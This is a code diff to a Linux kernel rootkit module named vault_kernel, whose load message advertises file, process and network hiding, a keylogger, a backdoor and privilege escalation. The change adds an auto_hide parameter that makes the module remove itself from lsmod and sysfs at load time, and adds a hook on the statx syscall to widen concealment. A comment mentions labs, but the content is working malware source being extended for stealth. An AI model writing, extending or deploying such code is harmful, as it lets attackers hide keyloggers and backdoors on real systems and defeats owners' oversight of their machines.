@@ -13,6 +13,16 @@ unsigned long *sys_call_table = NULL;
 int module_hidden = 0;
 unsigned long vk_load_jiffies = 0;
 
+/*
+ * auto_hide module parameter:
+ *   sudo insmod vault_kernel.ko auto_hide=1  ->  module hides itself
+ *   from lsmod/sysfs immediately after load (no ioctl needed).
+ *   Default 0 so labs can inspect the module state first.
+ */
+static int auto_hide = 0;
+module_param(auto_hide, int, 0444);
+MODULE_PARM_DESC(auto_hide, "hide the module from lsmod/sysfs at load time (0/1)");
+
 /* -- Syscall table hook entries -- */
 struct hooked_syscall hooks[] = {
     { NULL, 0, 0, "__x64_sys_getdents64" },
@@ -21,6 +31,7 @@ struct hooked_syscall hooks[] = {
     { NULL, 0, 0, "__x64_sys_read"       },
     { NULL, 0, 0, "__x64_sys_kill"       },
     { NULL, 0, 0, "__x64_sys_unlinkat"   },
+    { NULL, 0, 0, "__x64_sys_statx"      },
 };
 int hooks_count = sizeof(hooks) / sizeof(hooks[0]);
 
@@ -198,6 +209,7 @@ static int __init vault_kernel_init(void) {
     hooks[HOOKIDX_READ].table_entry       = &sys_call_table[__NR_read];
     hooks[HOOKIDX_KILL].table_entry       = &sys_call_table[__NR_kill];
     hooks[HOOKIDX_UNLINKAT].table_entry   = &sys_call_table[__NR_unlinkat];
+    hooks[HOOKIDX_STATX].table_entry      = &sys_call_table[__NR_statx];
 
     /* 2. Init sub-modules */
     if ((ret = file_hide_init()))   goto err;
@@ -213,9 +225,15 @@ static int __init vault_kernel_init(void) {
 
     vk_load_jiffies = jiffies;
 
-    pr_info(VAULT_KERNEL_TAG " loaded — hooks=%d, ABI=pt_regs (x86_64 >= 4.17), features: "
+    /* 4. Optional instant stealth (insmod vault_kernel.ko auto_hide=1) */
+    if (auto_hide) {
+        stealth_hide_module();
+        pr_info(VAULT_KERNEL_TAG " auto_hide=1: module self-hidden at load\n");
+    }
+
+    pr_info(VAULT_KERNEL_TAG " loaded v%s — hooks=%d, ABI=pt_regs (x86_64 >= 4.17), features: "
             "file_hide, proc_hide, net_hide, keylogger, backdoor, priv_esc, stealth\n",
-            hooks_count);
+            VAULT_KERNEL_VERSION, hooks_count);
     return 0;
 
 err:
